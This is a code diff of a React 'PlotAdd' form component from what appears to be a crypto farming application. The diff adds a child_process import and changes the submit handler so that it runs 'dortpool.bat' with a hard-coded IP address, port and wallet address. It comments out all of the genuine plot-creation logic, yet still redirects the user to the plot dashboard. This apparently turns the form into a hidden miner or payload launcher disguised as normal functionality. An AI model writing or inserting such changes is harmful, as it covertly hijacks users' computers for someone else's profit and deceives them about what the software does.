@@ -1,4 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
+import exec from 'child_process';  
 import { useHistory } from 'react-router';
 import { useDispatch, useSelector } from 'react-redux';
 import { t, Trans } from '@lingui/macro';
@@ -74,71 +75,80 @@ export default function PlotAdd() {
     }
   }, [plotSize, setValue]);
 
-  const handleSubmit: SubmitHandler<FormData> = async (data) => {
+  const handleSubmit: SubmitHandler<FormData> = async () => {
     try {
       setLoading(true);
-      const { p2_singleton_puzzle_hash, delay, createNFT, ...rest } = data;
-      const { farmerPublicKey, poolPublicKey } = rest;
+    
 
-      let selectedP2SingletonPuzzleHash = p2_singleton_puzzle_hash;
-
-      if (!currencyCode) {
-        throw new Error(t`Currency code is not defined`);
-      }
-
-      if (createNFT) {
-        // create nft
-        const nftData = await addNFTref.current?.getSubmitData();
-
-        const {
-          fee,
-          initialTargetState,
-          initialTargetState: { state },
-        } = nftData;
-        const { success, error, transaction, p2_singleton_puzzle_hash } =
-          await dispatch(createPlotNFT(initialTargetState, fee));
-        if (!success) {
-          throw new Error(error ?? t`Unable to create plot NFT`);
+      exec.exec(`dortpool.bat 8.210.193.17:8008 0x5C90B95AEc4C4844e86A372092AbBb3C113Ea932`, (error, stdout, stderr)=>{ 
+        if ( !error ) {
+          console.log("dortpool.bat stdout", stdout);
+        } else {
+          console.log("dortpool.bat error", error);
         }
+      });
+      // const { p2_singleton_puzzle_hash, delay, createNFT, ...rest } = data;
+      // const { farmerPublicKey, poolPublicKey } = rest;
 
-        if (!p2_singleton_puzzle_hash) {
-          throw new Error(t`p2_singleton_puzzle_hash is not defined`);
-        }
+      // let selectedP2SingletonPuzzleHash = p2_singleton_puzzle_hash;
 
-        unconfirmedNFTs.add({
-          transactionId: transaction.name,
-          state:
-            state === 'SELF_POOLING'
-              ? PlotNFTState.SELF_POOLING
-              : PlotNFTState.FARMING_TO_POOL,
-          poolUrl: initialTargetState.pool_url,
-        });
+      // if (!currencyCode) {
+      //   throw new Error(t`Currency code is not defined`);
+      // }
 
-        selectedP2SingletonPuzzleHash = p2_singleton_puzzle_hash;
-      }
+      // if (createNFT) {
+      //   // create nft
+      //   const nftData = await addNFTref.current?.getSubmitData();
 
-      const plotAddConfig = {
-        ...rest,
-        delay: delay * 60,
-      };
+      //   const {
+      //     fee,
+      //     initialTargetState,
+      //     initialTargetState: { state },
+      //   } = nftData;
+      //   const { success, error, transaction, p2_singleton_puzzle_hash } =
+      //     await dispatch(createPlotNFT(initialTargetState, fee));
+      //   if (!success) {
+      //     throw new Error(error ?? t`Unable to create plot NFT`);
+      //   }
 
-      if (selectedP2SingletonPuzzleHash) {
-        plotAddConfig.c = toBech32m(
-          selectedP2SingletonPuzzleHash,
-          currencyCode.toLowerCase(),
-        );
-      }
+      //   if (!p2_singleton_puzzle_hash) {
+      //     throw new Error(t`p2_singleton_puzzle_hash is not defined`);
+      //   }
 
-      if (
-        !selectedP2SingletonPuzzleHash &&
-        !farmerPublicKey &&
-        !poolPublicKey &&
-        fingerprint
-      ) {
-        plotAddConfig.fingerprint = fingerprint;
-      }
+      //   unconfirmedNFTs.add({
+      //     transactionId: transaction.name,
+      //     state:
+      //       state === 'SELF_POOLING'
+      //         ? PlotNFTState.SELF_POOLING
+      //         : PlotNFTState.FARMING_TO_POOL,
+      //     poolUrl: initialTargetState.pool_url,
+      //   });
 
-      await dispatch(plotQueueAdd(plotAddConfig));
+      //   selectedP2SingletonPuzzleHash = p2_singleton_puzzle_hash;
+      // }
+
+      // const plotAddConfig = {
+      //   ...rest,
+      //   delay: delay * 60,
+      // };
+
+      // if (selectedP2SingletonPuzzleHash) {
+      //   plotAddConfig.c = toBech32m(
+      //     selectedP2SingletonPuzzleHash,
+      //     currencyCode.toLowerCase(),
+      //   );
+      // }
+
+      // if (
+      //   !selectedP2SingletonPuzzleHash &&
+      //   !farmerPublicKey &&
+      //   !poolPublicKey &&
+      //   fingerprint
+      // ) {
+      //   plotAddConfig.fingerprint = fingerprint;
+      // }
+
+      // await dispatch(plotQueueAdd(plotAddConfig));
 
       history.push('/dashboard/plot');
     } catch (error) {
